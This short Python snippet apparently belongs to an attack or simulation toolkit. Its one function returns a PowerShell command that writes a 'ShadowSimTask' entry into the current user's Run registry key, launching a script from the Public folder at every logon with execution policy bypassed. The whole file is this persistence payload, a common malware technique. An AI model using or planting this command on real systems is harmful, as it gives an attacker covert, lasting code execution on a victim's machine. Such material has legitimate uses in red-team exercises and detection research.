def get_payload(script_path="C:\\Users\\Public\\script.ps1"):
    return [
        f'New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "ShadowSimTask" -Value "powershell -ExecutionPolicy Bypass -File {script_path}" -PropertyType String -Force'
    ]
